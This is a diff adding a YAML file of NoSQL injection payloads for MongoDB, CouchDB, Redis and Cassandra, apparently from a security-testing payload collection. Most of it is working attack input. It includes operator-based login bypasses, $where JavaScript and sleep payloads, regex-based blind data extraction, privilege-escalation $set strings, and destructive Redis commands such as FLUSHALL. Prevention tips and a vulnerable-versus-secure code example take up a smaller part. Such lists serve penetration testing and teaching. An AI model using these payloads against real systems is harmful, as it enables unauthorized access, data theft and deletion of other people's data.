@@ -1,0 +1,224 @@
+# NoSQL Injection Payloads
+# MongoDB, CouchDB, Redis, Cassandra
+
+payload_category: "nosql-injection"
+owasp_2025: "A05"
+cwe: "CWE-943"
+severity: "CRITICAL"
+
+# ===== MONGODB INJECTION =====
+mongodb_authentication_bypass:
+  json:
+    - '{"username": {"$ne": null}, "password": {"$ne": null}}'
+    - '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
+    - '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    - '{"username": "admin", "password": {"$regex": ".*"}}'
+  
+  url_encoded:
+    - "username[$ne]=null&password[$ne]=null"
+    - "username[$gt]=&password[$gt]="
+    - "username=admin&password[$regex]=.*"
+    - "username[$nin][]=admin&password[$ne]=1"
+
+mongodb_operator_injection:
+  comparison_operators:
+    - '{"$gt": ""}' # Greater than
+    - '{"$gte": ""}' # Greater than or equal
+    - '{"$lt": ""}' # Less than
+    - '{"$lte": ""}' # Less than or equal
+    - '{"$ne": ""}' # Not equal
+    - '{"$in": []}' # In array
+    - '{"$nin": []}' # Not in array
+  
+  logical_operators:
+    - '{"$and": []}'
+    - '{"$or": [{"username": "admin"}, {"username": "administrator"}]}'
+    - '{"$nor": [{"locked": true}]}'
+    - '{"$not": {"role": "user"}}'
+  
+  element_operators:
+    - '{"$exists": true}'
+    - value: '{"$type": 2}'
+      comment: "String type"
+
+mongodb_injection_methods:
+  where_clause:
+    - value: "{\"$where\": \"this.username == 'admin' || '1'=='1'\"}"
+      comment: "Condition always true"
+    - '{"$where": "sleep(5000)"}'
+    - '{"$where": "function() { return true; }"}'
+  
+  regex:
+    - '{"username": {"$regex": "^admin"}}'
+    - '{"password": {"$regex": ".*"}}'
+    - '{"email": {"$regex": ".*@admin\\.com"}}'
+
+# Blind NoSQL Injection (Boolean-based)
+mongodb_blind:
+  true_condition:
+    - '{"username": "admin", "password": {"$regex": "^a"}}'
+    - '{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}'
+  
+  false_condition:
+    - '{"username": "admin", "password": {"$regex": "^z"}}'
+
+# Time-based blind
+mongodb_time_based:
+  - '{"$where": "sleep(5000)"}'
+  - "{\"$where\": \"this.username=='admin' && sleep(5000) || '1'=='1'\"}"
+
+# ===== COUCHDB INJECTION =====
+couchdb_payloads:
+  - '{"selector": {"_id": {"$gte": null}}}'
+  - '{"selector": {"username": {"$regex": ".*"}}}'
+  - '{"$or": [{"username": "admin"}, {"role": "admin"}]}'
+
+# ===== REDIS INJECTION =====
+redis_commands:
+  - "KEYS *"
+  - "GET session:*"
+  - "CONFIG GET *"
+  - "FLUSHALL"
+  - "EVAL 'return redis.call(\"get\", KEYS[1])' 1 key"
+
+# ===== CASSANDRA INJECTION =====
+cassandra_payloads:
+  - "username = 'admin' OR '1'='1"
+  - "username = 'admin' -- "
+  - "username = 'admin' AND password = '' OR '1'='1"
+
+# ===== CONTEXT-SPECIFIC INJECTIONS =====
+
+# Login bypass
+login_bypass:
+  - '{"username": {"$ne": null}, "password": {"$ne": null}}'
+  - "username[$ne]=&password[$ne]="
+  - '{"username": "admin", "password": {"$gt": ""}}'
+
+# Data extraction
+data_extraction:
+  - '{"username": {"$regex": "^a"}}' # Starts with 'a'
+  - '{"email": {"$regex": ".*@company\\.com"}}'
+  - '{"$where": "this.password.length > 0"}'
+
+# Privilege escalation
+privilege_escalation:
+  - '{"$set": {"role": "admin"}}'
+  - '{"$rename": {"user": "admin"}}'
+  - "user[$set][role]=admin"
+
+# ===== ADVANCED TECHNIQUES =====
+
+# JavaScript injection in MongoDB
+javascript_injection:
+  - "{\"$where\": \"this.username == 'admin' && this.password.match(/.*/)\"}"
+  - '{"$where": "Object.keys(this).length > 0"}'
+  - "{\"$where\": \"function() { return this.username === 'admin'; }\"}"
+array_injection:
+  - '{"roles": {"$in": ["admin", "superuser"]}}'
+  - "roles[$in][]=admin&roles[$in][]=user"
+
+# Aggregation pipeline injection
+aggregation_injection:
+  - '{"$match": {"$or": [{"username": "admin"}, {"role": "admin"}]}}'
+  - '{"$group": {"_id": "$password"}}'
+
+# ===== DETECTION & EXPLOITATION =====
+
+detection_methods:
+  error_based:
+    - '{"username": {"$undefined": true}}'
+    - "Look for MongoDB error messages"
+  
+  boolean_based:
+    - "{\"username\": \"admin\", \"password\": {\"$ne\": \"wrong\"}}"
+    - "{\"username\": \"admin\", \"password\": {\"$eq\": \"wrong\"}}"
+  
+  time_based:
+    - '{"$where": "sleep(5000)"}'
+    - "Measure response time difference"
+
+# ===== TESTING METHODOLOGY =====
+
+testing_steps:
+  - "Identify injection points (login, search, filters)"
+  - "Test with $ne operator for auth bypass"
+  - "Try regex for data extraction"
+  - "Use $where for code execution"
+  - "Test boolean-based blind injection"
+  - "Try time-based if boolean fails"
+
+# Vulnerable parameter formats
+vulnerable_formats:
+  json_body:
+    - '{"username": "$USER_INPUT", "password": "$USER_INPUT"}'
+  
+  query_string:
+    - "?username=admin&password[$ne]=wrong"
+    - "?search[$regex]=.*"
+  
+  url_segment:
+    - "/api/users/$USER_INPUT"
+
+# ===== PREVENTION =====
+
+prevention:
+  input_validation:
+    - "Reject special characters: $, {, }, [, ]"
+    - "Whitelist allowed characters only"
+    - "Type checking (ensure strings are strings)"
+  
+  query_construction:
+    - "Use parameterized queries"
+    - "Never concatenate user input"
+    - "Cast user input to expected types"
+  
+  mongodb_specific:
+    - "Disable JavaScript execution: --noscripting"
+    - "Use $expr instead of $where when possible"
+    - "Validate object types before queries"
+  
+  general:
+    - "Principle of least privilege (database permissions)"
+    - "Input sanitization and validation"
+    - "Use ORM/ODM libraries safely"
+    - "Monitor for suspicious queries"
+
+# ===== EXAMPLES =====
+
+real_world_examples:
+  login_bypass_example:
+    vulnerable_code: |
+      db.users.findOne({
+        username: req.body.username,
+        password: req.body.password
+      })
+    
+    exploit: '{"username": {"$ne": null}, "password": {"$ne": null}}'
+    
+    secure_code: |
+      db.users.findOne({
+        username: String(req.body.username),
+        password: hash(String(req.body.password))
+      })
+  
+  regex_extraction:
+    vulnerable_code: |
+      db.users.find({username: {$regex: userInput}})
+    
+    exploit: '{"username": {"$regex": "^a"}}  # Extract usernames starting with "a"'
+
+# ===== TOOLS =====
+
+tools:
+  - "NoSQLMap"
+  - "Burp Suite (with NoSQL Extension)"
+  - "nosqli (nosql-exploitation-framework)"
+  - "mongoaudit"
+
+references:
+  - "OWASP Top 10:2025 A05"
+  - "CWE-943: NoSQL Injection"
+  - "PayloadsAllTheThings: NoSQL Injection"
+  - "MongoDB Security Checklist"
+  - "HackTricks: NoSQL Injection"
